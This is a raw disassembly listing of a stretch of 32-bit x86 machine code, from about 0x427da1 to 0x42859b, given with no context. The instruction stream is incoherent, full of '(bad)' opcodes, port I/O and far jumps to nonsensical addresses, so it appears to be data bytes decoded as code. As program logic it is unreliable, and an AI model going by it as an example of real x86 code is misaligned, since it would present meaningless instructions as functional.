  427da1:	jp     0x427e20
  427da3:	xchg   ebp,esp
  427da5:	div    DWORD PTR [eax-0xf7335bd]
  427dab:	je     0x427d5e
  427dad:	(bad)  
  427dae:	jecxz  0x427de1
  427db0:	push   edx
  427db1:	stos   DWORD PTR es:[edi],eax
  427db2:	fild   DWORD PTR [ecx+ebp*4+0x30]
  427db6:	repnz dec edi
  427db8:	pop    ds
  427db9:	add    eax,esi
  427dbb:	mov    al,ds:0x6b6e22f3
  427dc0:	dec    edi
  427dc1:	addr16 jmp 0x1036:0xa2371c74
  427dc9:	xchg   ecx,eax
  427dca:	cmp    BYTE PTR [edi-0x1192226c],0x8
  427dd1:	dec    esi
  427dd2:	out    0xab,eax
  427dd4:	test   eax,0x8129dac1
  427dd9:	pop    edx
  427dda:	lahf   
  427ddb:	jmp    FWORD PTR [edi+eiz*4-0x3a5a7ebd]
  427de2:	lea    eax,[edx+0x1d]
  427de5:	leave  
  427de6:	mov    ebx,0x60965983
  427dec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427ded:	sub    DWORD PTR [eax+0x10bc9552],edx
  427df3:	cmp    DWORD PTR [edx],eax
  427df5:	sub    ah,BYTE PTR [eax+edi*8-0x6e]
  427df9:	add    DWORD PTR [esi],edx
  427dfb:	add    DWORD PTR [edi+ecx*2-0x56],ecx
  427dff:	xchg   ebx,eax
  427e00:	imul   edx,DWORD PTR [eax-0x2967269a],0xffffffa8
  427e07:	into   
  427e08:	mov    DWORD PTR [ecx+0x116426e0],ecx
  427e0e:	mov    al,0xc3
  427e10:	ja     0x427e07
  427e12:	repnz cmp eax,0xd19f5fd0
  427e18:	pop    ss
  427e19:	sbb    al,0x17
  427e1b:	scas   eax,DWORD PTR es:[edi]
  427e1c:	xchg   esi,eax
  427e1d:	xor    DWORD PTR [edi+0x8b78566],edx
  427e23:	jg     0x427e55
  427e25:	pop    esi
  427e26:	or     al,0x4b
  427e28:	lea    edx,[ebx+0x10328ba1]
  427e2e:	jmp    0x3dcd8d9e
  427e33:	aas    
  427e34:	call   0x9e46a041
  427e39:	push   es
  427e3a:	xchg   ebx,eax
  427e3b:	xor    al,ch
  427e3d:	jb     0x427e38
  427e3f:	inc    ebx
  427e40:	icebp  
  427e41:	push   esp
  427e42:	test   eax,0xc69a66d3
  427e47:	dec    edi
  427e48:	(bad)  
  427e49:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427e4a:	cmp    DWORD PTR [edi+ebx*4+0x1b],ebp
  427e4e:	stos   BYTE PTR es:[edi],al
  427e4f:	dec    ebp
  427e50:	loop   0x427e80
  427e52:	jns    0x427e15
  427e54:	sub    DWORD PTR ds:0x120cc12f,0x31
  427e5b:	jg     0x427e44
  427e5d:	adc    BYTE PTR [edx],dl
  427e5f:	mov    dl,0x7b
  427e61:	call   DWORD PTR [ebx]
  427e63:	rcr    BYTE PTR [esi+0xe2b186d],1
  427e69:	push   edx
  427e6a:	xchg   edx,eax
  427e6b:	call   0xcd1:0xa500659
  427e72:	lock xchg ebp,eax
  427e74:	sub    al,0xa2
  427e76:	fwait
  427e77:	sub    DWORD PTR [edi+0x7d5bb02b],eax
  427e7d:	out    dx,al
  427e7e:	xlat   BYTE PTR ds:[ebx]
  427e7f:	psubsb mm5,QWORD PTR [ebx+0x6a]
  427e83:	retf   
  427e84:	sar    ecx,cl
  427e86:	(bad)  
  427e87:	mov    esi,0x5f1d5444
  427e8c:	shl    BYTE PTR [ebx+edx*1+0x475473e0],0xce
  427e94:	xchg   ebx,eax
  427e95:	xchg   DWORD PTR [ebx+0x27],edx
  427e98:	hlt    
  427e99:	and    al,0x5a
  427e9b:	xchg   esi,ebx
  427e9d:	adc    dh,bl
  427e9f:	lock push eax
  427ea1:	inc    ebp
  427ea2:	inc    esi
  427ea3:	adc    DWORD PTR [edi],ebp
  427ea5:	mov    ds:0x46f1798f,eax
  427eaa:	or     BYTE PTR [ecx-0xd],0x72
  427eae:	out    0x6b,eax
  427eb0:	push   cs
  427eb1:	or     dl,bh
  427eb3:	and    BYTE PTR ds:0x74f8bb89,0xab
  427eba:	mov    eax,ecx
  427ebc:	out    dx,eax
  427ebd:	and    bl,BYTE PTR [esi]
  427ebf:	lea    edx,[edi]
  427ec1:	scas   al,BYTE PTR es:[edi]
  427ec2:	retf   0xd137
  427ec5:	mov    al,ds:0x59695828
  427eca:	push   edx
  427ecb:	and    DWORD PTR [edx+0xa237fc8],esi
  427ed1:	mov    ds:0x70f94d7c,eax
  427ed6:	sbb    eax,0xa6b2ba1b
  427edb:	not    DWORD PTR [ebx-0x2c]
  427ede:	mov    bh,0xef
  427ee0:	pop    ecx
  427ee1:	pop    ecx
  427ee2:	xor    WORD PTR [edx],cx
  427ee5:	dec    ebp
  427ee6:	fs pop ebp
  427ee8:	aas    
  427ee9:	in     al,dx
  427eea:	sbb    eax,DWORD PTR ss:[esi]
  427eed:	push   ebx
  427eee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427eef:	mov    WORD PTR [edx-0x2c8a5f42],es
  427ef5:	adc    edx,DWORD PTR [eax]
  427ef7:	and    al,0xb5
  427ef9:	rcl    BYTE PTR [edi],0xc5
  427efc:	lods   al,BYTE PTR ds:[esi]
  427efd:	mov    ebx,0xc92f95d6
  427f02:	add    DWORD PTR ds:0x9c7c542b,eax
  427f08:	adc    eax,0x5f02404a
	...
  427f19:	add    BYTE PTR [edx-0x107ddbc],bl
  427f1f:	(bad)  
  427f20:	fisub  DWORD PTR [esi-0x37]
  427f23:	and    dh,BYTE PTR [ecx+edx*1+0x27]
  427f27:	into   
  427f28:	cs into 
  427f2a:	jmp    0x427f1f
  427f2c:	add    DWORD PTR [eax],eax
  427f2e:	sti    
  427f2f:	add    DWORD PTR [eax],eax
  427f31:	add    BYTE PTR [ebp+0x40],bl
  427f34:	xchg   dl,al
  427f36:	mov    dh,0xa0
  427f38:	outs   dx,DWORD PTR ds:[esi]
  427f39:	push   eax
  427f3a:	push   es
  427f3b:	sbb    BYTE PTR [edx-0x43],0xcc
  427f3f:	or     dh,cl
  427f41:	retf   0x6498
  427f44:	sub    DWORD PTR [ebx-0x4],eax
  427f47:	lock fidivr DWORD PTR [esi-0x7]
  427f4b:	xchg   DWORD PTR [eax+0x49],ebx
  427f4e:	adc    BYTE PTR [esp+esi*1+0x0],dl
  427f52:	add    ah,0x9b
  427f55:	adc    DWORD PTR [ebp*1+0x64931098],esi
  427f5c:	ret    0xd51d
  427f5f:	arpl   WORD PTR [esi+0x60],ax
  427f62:	cmc    
  427f63:	loop   0x427f11
  427f65:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427f66:	sub    ch,BYTE PTR [esp+eax*1+0x34f0e50]
  427f6d:	add    DWORD PTR [esi-0x3d140fc6],edx
  427f73:	sub    bl,BYTE PTR [edi+0x79c3b6b1]
  427f79:	mov    esi,0xfe0d127e
  427f7e:	div    DWORD PTR [ecx-0xf]
  427f81:	push   eax
  427f82:	call   0x53c5:0xaa83e52c
  427f89:	arpl   di,bx
  427f8b:	pop    ebx
  427f8c:	daa    
  427f8d:	pop    ds
  427f8e:	pop    ss
  427f8f:	icebp  
  427f90:	inc    ecx
  427f91:	pop    eax
  427f92:	jge    0x427f5a
  427f94:	in     eax,0x36
  427f96:	test   BYTE PTR [ebx+0x39211493],0x55
  427f9d:	cmp    edi,DWORD PTR [edi-0x4ffdb225]
  427fa3:	ror    DWORD PTR [ecx+0x12],cl
  427fa6:	js     0x427f9b
  427fa8:	mov    esi,0x4db5a648
  427fad:	cdq    
  427fae:	aas    
  427faf:	push   ebp
  427fb0:	cs in  al,dx
  427fb2:	and    BYTE PTR [ebp-0x6b],ch
  427fb5:	(bad)  
  427fb6:	dec    edx
  427fb7:	mov    esi,0x4cdaafa5
  427fbc:	neg    DWORD PTR [edi]
  427fbe:	loopne 0x427fd0
  427fc0:	xor    BYTE PTR [ebp-0xf],0x84
  427fc4:	pop    ebx
  427fc5:	test   eax,0x92501143
  427fca:	enter  0x63f2,0xa4
  427fce:	scas   al,BYTE PTR es:[edi]
  427fcf:	outs   dx,DWORD PTR ds:[esi]
  427fd0:	mov    ebp,0xd819bd20
  427fd5:	sub    al,0xd
  427fd7:	mov    al,ds:0xf17e5321
  427fdc:	add    eax,0x255bffd7
  427fe1:	xor    eax,ebx
  427fe3:	xor    al,0xf0
  427fe5:	aad    0x17
  427fe7:	inc    ebp
  427fe8:	xor    dl,dh
  427fea:	es xchg ebp,eax
  427fec:	mov    dl,0xa6
  427fee:	jnp    0x42801d
  427ff0:	daa    
  427ff1:	cmp    al,0x1d
  427ff3:	sub    dl,bl
  427ff5:	pushf  
  427ff6:	ret    
  427ff7:	jae    0x427fbb
  427ff9:	mul    DWORD PTR gs:[edi+edi*8+0x690073c6]
  428001:	cmp    al,0xca
  428003:	push   ecx
  428004:	and    cl,ch
  428006:	cli    
  428007:	inc    esi
  428008:	in     al,dx
  428009:	inc    eax
  42800a:	in     al,0xec
  42800c:	ja     0x428051
  42800e:	jae    0x427ff4
  428010:	jmp    0x3d94:0x5abd98a0
  428017:	scas   eax,DWORD PTR es:[edi]
  428018:	ret    
  428019:	and    esp,edx
  42801b:	mov    bh,0xce
  42801d:	lods   al,BYTE PTR ds:[esi]
  42801e:	jp     0x428022
  428020:	or     ah,BYTE PTR [eax+0x3d03d3bc]
  428026:	mov    bl,0xd
  428028:	jl     0x427fe2
  42802a:	pop    esi
  42802b:	fisub  DWORD PTR [esi]
  42802d:	xor    cl,BYTE PTR [edx]
  42802f:	lock dec eax
  428031:	fcomp  DWORD PTR [ebx+ebx*8]
  428034:	sbb    DWORD PTR ds:0xd30b903a,ebp
  42803a:	(bad)  
  42803c:	jne    0x4280b4
  42803e:	jno    0x428071
  428040:	xor    eax,0x41734630
  428045:	ja     0x428034
  428047:	out    0x5c,al
  428049:	adc    ebp,edi
  42804b:	push   es
  42804c:	xchg   ebx,eax
  42804d:	ret    
  42804e:	xchg   ecx,eax
  42804f:	xor    edi,DWORD PTR [ebx-0x46]
  428052:	call   0x2d4961c6
  428057:	push   eax
  428058:	loopne 0x428088
  42805a:	lahf   
  42805b:	retf   
  42805c:	popa   
  42805d:	jmp    0xe9a:0x21d4c91d
  428064:	sahf   
  428065:	sar    DWORD PTR [ebx+esi*8+0x15],cl
  428069:	jo     0x42803b
  42806b:	repz cwde 
  42806d:	jecxz  0x427ffb
  42806f:	xchg   esi,eax
  428070:	(bad)  [eax-0x3e9ec697]
  428076:	jge    0x42805a
  428078:	add    DWORD PTR [ebx+0x26ac8995],0xffffff9d
  42807f:	jge    0x42808e
  428081:	jb     0x4280aa
  428083:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428084:	or     al,0x3c
  428086:	vpsrld xmm4,xmm3,xmm1
  42808a:	js     0x42809d
  42808c:	xor    esi,eax
  42808e:	retf   0xeb2e
  428091:	xor    DWORD PTR [ecx+eiz*1-0x4a],0xffffffd1
  428096:	push   esi
  428097:	push   edi
  428098:	mov    bh,0x60
  42809a:	mov    ecx,0xc5aea795
  42809f:	in     eax,dx
  4280a0:	mov    dl,0x19
  4280a2:	shl    BYTE PTR [ebx+0x70],cl
  4280a5:	xor    esi,DWORD PTR [esi-0x7aa258df]
  4280ab:	mov    ebx,eax
  4280ad:	ins    DWORD PTR es:[edi],dx
  4280ae:	jmp    0x54565d3a
  4280b3:	jle    0x42809c
  4280b5:	fcom   DWORD PTR [edi-0x34]
  4280b8:	aam    0x12
  4280ba:	push   ds
  4280bb:	or     dl,bl
  4280bd:	cmp    eax,eax
  4280bf:	pop    ebp
  4280c0:	imul   eax,esp,0x30304911
  4280c6:	inc    esp
  4280c7:	cli    
  4280c8:	mov    esi,0x70bf03c2
  4280cd:	bound  edx,QWORD PTR ds:0x74e965da
  4280d3:	idiv   BYTE PTR [eax+eax*8]
  4280d6:	rol    DWORD PTR [edi],cl
  4280d8:	fidivr WORD PTR [esi+0x73afe92e]
  4280de:	js     0x4280a8
  4280e0:	add    ebx,DWORD PTR [esi+0x6]
  4280e3:	push   ss
  4280e4:	inc    edi
  4280e5:	into   
  4280e6:	add    eax,DWORD PTR [eax]
  4280e8:	jo     0x428087
  4280ea:	pusha  
  4280eb:	sbb    ebp,ecx
  4280ed:	pop    ecx
  4280ee:	mov    ebx,0x91ff846a
  4280f3:	(bad)  
  4280f4:	mov    dh,BYTE PTR [ebp-0x9]
  4280f7:	jb     0x428148
  4280f9:	mov    ebx,0x99e88ebd
  4280fe:	cwde   
  4280ff:	sbb    esp,0x75
  428102:	mov    ecx,0x506f5b14
  428107:	scas   al,BYTE PTR es:[edi]
  428108:	xchg   ebp,eax
  428109:	add    al,0xfd
  42810b:	in     eax,0xef
  42810d:	das    
  42810e:	out    dx,eax
  42810f:	cmp    eax,0x5c43fa79
  428114:	cs pop eax
  428116:	jns    0x428172
  428118:	arpl   WORD PTR [eax],ax
  42811a:	jecxz  0x428103
  42811c:	pop    eax
  42811d:	cs pop ds
  42811f:	or     BYTE PTR [eax],0x9b
  428122:	lea    ebx,[ecx+ecx*8]
  428125:	data16 mov al,0x7f
  428128:	xor    al,0x9c
  42812a:	(bad)  
  42812b:	fistp  WORD PTR ds:0x0
	...
  428139:	add    BYTE PTR [eax+0x3fc326ab],dl
  42813f:	iret   
  428140:	cmc    
  428141:	sti    
  428142:	pushf  
  428143:	and    al,0x28
  428145:	push   ebp
  428146:	pop    esp
  428147:	arpl   cx,cx
  428149:	jo     0x428131
  42814b:	cmc    
  42814c:	add    DWORD PTR [eax],eax
  42814e:	sti    
  42814f:	add    DWORD PTR [eax],eax
  428151:	add    BYTE PTR [eax],bh
  428153:	xor    BYTE PTR [esi-0x4dcd2b1a],ch
  428159:	iret   
  42815a:	es pop edx
  42815c:	inc    esp
  42815d:	dec    ecx
  42815e:	add    esp,ebx
  428160:	aaa    
  428161:	clc    
  428162:	outs   dx,BYTE PTR ds:[esi]
  428163:	sbb    bh,BYTE PTR [eax-0x7ee918f4]
  428169:	repz repz leave 
  42816c:	sub    DWORD PTR [edi-0x2d],0xee143753
  428173:	pop    es
  428174:	into   
  428175:	bound  esi,QWORD PTR [ecx-0x72]
  428178:	sbb    edx,DWORD PTR [edi]
  42817a:	or     BYTE PTR [eax-0x7bb2fd5c],0x13
  428181:	daa    
  428182:	hlt    
  428183:	in     eax,dx
  428184:	ja     0x4281fc
  428186:	pop    eax
  428187:	out    0x14,eax
  428189:	adc    dh,BYTE PTR [ecx]
  42818b:	ds sti 
  42818d:	aad    0x5f
  42818f:	push   ss
  428190:	lods   al,BYTE PTR ds:[esi]
  428191:	aas    
  428192:	mov    esp,0x41c66f4
  428197:	mov    WORD PTR [ebx+0x46a13bf3],fs
  42819d:	lock mov bl,BYTE PTR [ebx+0x27]
  4281a1:	push   es
  4281a2:	neg    BYTE PTR [esi-0x3e660d32]
  4281a8:	mov    dl,0x74
  4281aa:	and    al,0x97
  4281ac:	mov    eax,ds:0x8f67c471
  4281b1:	pop    ebx
  4281b2:	push   ds
  4281b3:	int3   
  4281b4:	adc    al,0x3b
  4281b6:	psubw  mm7,QWORD PTR [edi]
  4281b9:	mov    edx,0x4bf59085
  4281be:	add    bh,dl
  4281c0:	mov    al,ds:0x6a0bec82
  4281c5:	pop    ebp
  4281c6:	or     ebp,ebx
  4281c8:	mov    esp,0x3384e3a9
  4281cd:	retf   
  4281ce:	sub    al,0xd5
  4281d0:	and    BYTE PTR [esi+0x3aef293d],bl
  4281d6:	in     al,dx
  4281d7:	fwait
  4281d8:	stc    
  4281d9:	fnstenv [esi-0x41]
  4281dc:	(bad)  
  4281dd:	push   eax
  4281de:	push   0xf075abc9
  4281e3:	std    
  4281e4:	fdiv   DWORD PTR [edx]
  4281e6:	ins    BYTE PTR es:[edi],dx
  4281e7:	std    
  4281e8:	push   esi
  4281e9:	mov    DWORD PTR [esi+0x7a],edi
  4281ec:	adc    edx,DWORD PTR [ebx+edi*8+0x4c555458]
  4281f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4281f4:	push   ds
  4281f5:	dec    ebp
  4281f6:	adc    edi,DWORD PTR [esi+0x704467a8]
  4281fc:	popf   
  4281fd:	pop    es
  4281fe:	pop    ebx
  4281ff:	or     BYTE PTR [esp+ebx*2+0x29],cl
  428203:	add    bh,BYTE PTR [ecx+0x47cbb48d]
  428209:	nop
  42820a:	xchg   edx,eax
  42820b:	dec    ebp
  42820c:	adc    BYTE PTR [edx+0x1a],0x74
  428210:	mov    BYTE PTR [edi+0x10],al
  428213:	repnz mov ebp,0x5900bf74
  428219:	sbb    edx,DWORD PTR [edi-0x64fbf363]
  42821f:	lea    ebx,[ebx]
  428221:	sbb    DWORD PTR ds:0xebc14a49,ecx
  428227:	inc    ebx
  428228:	adc    BYTE PTR [ecx],bh
  42822a:	test   BYTE PTR [edi+0x7596c5e],ch
  428230:	nop
  428231:	mov    ch,0x7b
  428233:	jne    0x4281c3
  428235:	hlt    
  428236:	inc    ecx
  428237:	cmp    DWORD PTR [ecx-0x1f],ebp
  42823a:	cmp    BYTE PTR [esi+0x168870a8],ah
  428240:	in     eax,dx
  428241:	(bad)  
  428242:	aaa    
  428243:	ror    DWORD PTR [ebp+0x14e47b78],0xb1
  42824a:	pop    edi
  42824b:	ds aaa 
  42824d:	out    dx,al
  42824e:	cmp    dl,BYTE PTR [eax+0x5c1890ed]
  428254:	jp     0x428246
  428256:	mov    ebx,0xf680cd9e
  42825b:	in     al,0x2
  42825d:	mov    al,ds:0x23a371ce
  428262:	push   esp
  428263:	mov    bl,0x3c
  428265:	pop    edi
  428266:	jge    0x4281fe
  428268:	in     eax,dx
  428269:	mov    al,ds:0x5b088a70
  42826e:	sti    
  42826f:	lock enter 0xfd0b,0xb9
  428274:	int3   
  428275:	jmp    0x4a1c0376
  42827a:	pop    ebx
  42827b:	jae    0x42829c
  42827d:	mov    edx,ecx
  42827f:	mov    esi,0xae5beed6
  428284:	mov    cs,WORD PTR [eax]
  428286:	mov    cl,0x9c
  428288:	mov    eax,ds:0x9cd1ca43
  42828d:	arpl   WORD PTR [edx+edx*1],cx
  428290:	jo     0x42822e
  428292:	mov    esp,DWORD PTR [ecx+eiz*4+0x628bacaa]
  428299:	paddw  mm4,mm1
  42829c:	pop    ecx
  42829d:	fidivr DWORD PTR [ebp+0x3e]
  4282a0:	push   ss
  4282a1:	pusha  
  4282a2:	push   es
  4282a3:	xor    ecx,DWORD PTR [esi+0x60ea9e5d]
  4282a9:	(bad)  [ebx+0xef34a28]
  4282af:	and    dh,BYTE PTR [esi+ecx*4+0x637feaa0]
  4282b6:	out    dx,al
  4282b7:	test   BYTE PTR [eax],dl
  4282b9:	xor    ebx,DWORD PTR [esi]
  4282bb:	(bad)  
  4282bd:	cdq    
  4282be:	sub    esi,DWORD PTR [edx+0x16a31a8f]
  4282c4:	fstp   QWORD PTR [eax-0x5]
  4282c7:	cmp    dh,BYTE PTR [ebx-0x41229056]
  4282cd:	cmc    
  4282ce:	fcom   DWORD PTR ss:[edi+0xf08dbe5]
  4282d5:	daa    
  4282d6:	mov    al,0x29
  4282d8:	test   eax,0xd40711b0
  4282dd:	cli    
  4282de:	mov    bl,0x91
  4282e0:	les    edx,FWORD PTR [edx]
  4282e2:	test   BYTE PTR [edi+0x3daee374],dh
  4282e8:	sbb    al,0xbe
  4282ea:	inc    eax
  4282eb:	mov    ecx,0x42714670
  4282f0:	lods   al,BYTE PTR ds:[esi]
  4282f1:	adc    esp,DWORD PTR [edi-0x2add4e83]
  4282f7:	lods   al,BYTE PTR ds:[esi]
  4282f8:	fdiv   st,st(1)
  4282fa:	adc    DWORD PTR [eax],esi
  4282fc:	aad    0xd
  4282fe:	dec    ebp
  4282ff:	jns    0x428323
  428301:	mov    ds,WORD PTR [eax-0x1a]
  428304:	popf   
  428305:	sub    DWORD PTR [eax+ebx*2-0x5f],esi
  428309:	arpl   WORD PTR [edi-0x10],di
  42830c:	ds out 0x5d,al
  42830f:	push   ebx
  428310:	xlat   BYTE PTR ds:[ebx]
  428311:	jb     0x428346
  428313:	shr    eax,1
  428315:	aas    
  428316:	retf   
  428317:	mov    ds:0xc6f2b175,al
  42831c:	pop    esi
  42831d:	add    al,0x8e
  42831f:	and    ebx,edi
  428321:	xchg   ebp,eax
  428322:	lods   al,BYTE PTR ds:[esi]
  428323:	test   BYTE PTR [eax+0x20],dh
  428326:	sub    ch,BYTE PTR [edi]
  428328:	out    dx,eax
  428329:	(bad)  
  42832a:	or     BYTE PTR [edi+ebx*1],bh
  42832d:	jmp    0x69507acc
  428332:	in     al,dx
  428333:	pop    ds
  428334:	(bad)  
  428335:	sahf   
  428336:	das    
  428337:	stos   DWORD PTR es:[edi],eax
  428338:	lods   al,BYTE PTR ds:[esi]
  428339:	pop    edi
  42833a:	push   esi
  42833b:	sbb    eax,0xcb0e128c
  428340:	sbb    BYTE PTR [esi],bl
  428342:	and    al,0x41
  428344:	in     eax,dx
  428345:	in     al,dx
  428346:	push   esi
  428347:	sub    BYTE PTR [edi-0x51],ah
  42834a:	test   DWORD PTR [edi],ebx
  42834c:	dec    ebp
	...
  428359:	add    ch,bh
  42835b:	cmp    DWORD PTR ds:0xfd1cf514,esi
  428361:	stc    
  428362:	jl     0x428396
  428364:	stc    
  428365:	jne    0x428351
  428367:	push   edx
  428368:	call   FWORD PTR [ecx-0x1f]
  42836b:	test   DWORD PTR [ecx],0x1fb00
  428371:	add    BYTE PTR ds:0x905799ff,al
  428377:	inc    esi
  428378:	dec    ebp
  428379:	jb     0x4282ff
  42837b:	inc    edx
  42837c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42837d:	ins    BYTE PTR es:[edi],dx
  42837e:	jae    0x4283d7
  428380:	or     ebx,DWORD PTR ds:0x290a7237
  428386:	adc    edi,DWORD PTR [ebp-0x33bc084f]
  42838c:	xchg   ebx,eax
  42838d:	dec    ecx
  42838e:	dec    esi
  42838f:	inc    ecx
  428390:	test   esp,esi
  428392:	cmp    BYTE PTR [edi-0x26c4914],al
  428398:	ror    ebp,1
  42839a:	jmp    0x7cf98868
  42839f:	inc    esp
  4283a0:	sub    dl,BYTE PTR [edi-0x66]
  4283a3:	xor    DWORD PTR [esi],0x4c
  4283a6:	sub    dh,ch
  4283a8:	outs   dx,DWORD PTR ds:[esi]
  4283a9:	addr16 loop 0x42832f
  4283ac:	sbb    eax,0xb71214e0
  4283b1:	mov    eax,0x5186c006
  4283b6:	jmp    0xa9bdce3b
  4283bb:	inc    ebp
  4283bc:	mov    eax,ds:0xd7098e2c
  4283c1:	mov    esp,0x1693c224
  4283c6:	jl     0x4283fe
  4283c8:	cmp    BYTE PTR [ebp+0x4b],bl
  4283cb:	xchg   esp,eax
  4283cc:	pop    ebp
  4283cd:	icebp  
  4283ce:	jmp    0x4283c1
  4283d0:	lock jns 0x428431
  4283d3:	add    cl,BYTE PTR [eax+0x2d]
  4283d6:	int3   
  4283d7:	loop   0x428407
  4283d9:	popa   
  4283da:	aaa    
  4283db:	mov    al,ds:0xab4cfdac
  4283e0:	push   0xf20b91be
  4283e5:	mov    bl,0xed
  4283e7:	lock adc ch,BYTE PTR ds:0x72df5652
  4283ee:	int3   
  4283ef:	dec    esi
  4283f0:	addr16 std 
  4283f2:	cmp    cl,BYTE PTR [eax-0x31]
  4283f5:	js     0x4283ca
  4283f7:	enter  0x95aa,0xa4
  4283fb:	popa   
  4283fc:	std    
  4283fd:	pop    es
  4283fe:	pusha  
  4283ff:	pushf  
  428400:	es adc eax,0xd847db39
  428406:	cmp    eax,0xbbe85480
  42840b:	inc    edi
  42840c:	sub    eax,0xc787aa0c
  428411:	add    esi,0xac2a5e7a
  428417:	xlat   BYTE PTR ds:[ebx]
  428418:	mov    ah,0xab
  42841a:	(bad)  
  42841b:	xchg   ecx,eax
  42841c:	inc    eax
  42841d:	dec    ebp
  42841e:	addr16 mov al,ds:0x8ca
  428422:	in     eax,dx
  428423:	sbb    ch,cl
  428425:	xor    DWORD PTR [edx-0x6c7e1de9],0xd9c6fc09
  42842f:	ror    BYTE PTR [ebx],cl
  428431:	and    DWORD PTR [ecx+0x16],0xb25875ca
  428438:	cmp    DWORD PTR [ecx-0x53e26848],esp
  42843e:	fistp  WORD PTR [ecx]
  428440:	fmul   DWORD PTR [edi-0x5e]
  428443:	shl    BYTE PTR ds:0x528983fa,1
  428449:	sub    bh,BYTE PTR ds:0xbdcd248
  42844f:	xchg   edi,eax
  428450:	enter  0x4d39,0xe0
  428454:	sbb    ch,dh
  428456:	ss in  eax,dx
  428458:	cmc    
  428459:	jne    0x428403
  42845b:	imul   esp,DWORD PTR [bx-0x50],0x6a29c988
  428463:	int3   
  428464:	xchg   ecx,eax
  428465:	xor    edi,DWORD PTR [esi+0x78fca87]
  42846b:	jbe    0x42847f
  42846d:	add    ecx,edi
  42846f:	mul    DWORD PTR [eax+eiz*1-0x53]
  428473:	inc    esi
  428474:	loopne 0x428499
  428476:	push   0xf04f2a04
  42847b:	dec    ecx
  42847c:	shr    esp,1
  42847e:	pop    esp
  42847f:	cmp    ah,BYTE PTR [eax+0x77a54133]
  428485:	fsub   DWORD PTR [ebx-0x5b]
  428488:	mov    cl,0x61
  42848a:	sub    al,cl
  42848c:	adc    eax,0x1ff6f6c1
  428491:	not    BYTE PTR [esi]
  428493:	aam    0x23
  428495:	add    DWORD PTR [edx+0x4933fc46],edx
  42849b:	inc    esp
  42849c:	fidivr DWORD PTR [esi+0x6cb54c63]
  4284a2:	inc    eax
  4284a3:	aam    0x96
  4284a5:	ins    BYTE PTR es:[edi],dx
  4284a6:	leave  
  4284a7:	ror    DWORD PTR [edx],cl
  4284a9:	scas   eax,DWORD PTR es:[edi]
  4284aa:	pop    eax
  4284ab:	and    edi,DWORD PTR [eax]
  4284ad:	xchg   esp,eax
  4284ae:	adc    eax,0xb26b74c2
  4284b3:	dec    esi
  4284b4:	sub    al,0x63
  4284b6:	enter  0x5e77,0x61
  4284ba:	dec    eax
  4284bb:	ins    DWORD PTR es:[edi],dx
  4284bc:	retf   0x876e
  4284bf:	push   0xfc42bd05
  4284c4:	clc    
  4284c5:	in     eax,dx
  4284c6:	jecxz  0x42848e
  4284c8:	test   BYTE PTR [ecx],bl
  4284ca:	xchg   edx,eax
  4284cb:	jg     0x428527
  4284cd:	jae    0x4284b6
  4284cf:	dec    eax
  4284d0:	jae    0x428459
  4284d2:	imul   esp,DWORD PTR [esi-0x2],0xffffffaf
  4284d6:	xchg   ecx,eax
  4284d7:	sbb    esi,ecx
  4284d9:	rcr    DWORD PTR [ecx+0x59],1
  4284dc:	adc    al,0xa6
  4284de:	add    bh,0x74
  4284e1:	push   ebx
  4284e2:	aam    0x5f
  4284e4:	ja     0x42849d
  4284e6:	push   esp
  4284e7:	xor    DWORD PTR [eax+0x2a],ebx
  4284ea:	in     al,dx
  4284eb:	sbb    ecx,0x48608902
  4284f1:	cmp    ch,0xc1
  4284f4:	mov    DWORD PTR [edi+0x2d96739f],ebp
  4284fa:	and    al,0xce
  4284fc:	dec    esi
  4284fd:	test   eax,0x44c6e402
  428502:	jb     0x428539
  428504:	retf   
  428505:	call   0xbb36:0x509facc6
  42850c:	xor    al,0x14
  42850e:	popf   
  42850f:	adc    edx,edi
  428511:	cli    
  428512:	push   ebp
  428513:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428514:	(bad)  
  428515:	mov    eax,0x9fc183d3
  42851a:	mov    WORD PTR [edi+0x38],?
  42851d:	add    DWORD PTR [esi+esi*8+0x6ece2b3d],0xffffffc6
  428525:	ds push eax
  428527:	push   ds
  428528:	sbb    cl,dl
  42852a:	shl    DWORD PTR [edi-0x27],0x37
  42852e:	dec    ebp
  42852f:	and    eax,0x7f5ba0df
  428534:	rcl    BYTE PTR [eax],0xa8
  428537:	jo     0x4285b1
  428539:	lea    ebp,[edx-0x1e]
  42853c:	mov    WORD PTR [esi+0x79bf9134],cs
  428542:	inc    ebx
  428543:	int3   
  428544:	adc    BYTE PTR [esi-0xd],0xef
  428548:	and    edx,DWORD PTR [ecx]
  42854a:	adc    BYTE PTR [bx+di],dh
  42854d:	pop    esp
  42854e:	or     al,0x0
  428550:	loope  0x428558
  428552:	into   
  428553:	mov    ds:0xaddf8d63,eax
  428558:	leave  
  428559:	hlt    
  42855a:	rcl    BYTE PTR [ebx+ebp*1],0xdb
  42855e:	dec    ecx
  42855f:	inc    ebp
  428560:	cs inc eax
  428562:	cmp    dh,BYTE PTR ds:0x79c05ab5
  428568:	add    al,0x4a
  42856a:	sbb    esp,DWORD PTR [ebp-0x67]
	...
  428579:	add    BYTE PTR [ecx-0x7d39faf],ch
  42857f:	cmp    eax,0x65b9d5ed
  428584:	test   BYTE PTR [ecx-0x25a895b5],ch
  42858a:	fdiv   st(1),st
  42858c:	add    DWORD PTR [eax],eax
  42858e:	or     eax,0x79000000
  428593:	je     0x4285ae
  428595:	jp     0x4285eb
  428597:	sbb    DWORD PTR [eax],ebp
  428599:	(bad)  
  42859a:	sti    
  42859b:	adc    eax,0x9fd7a
	...
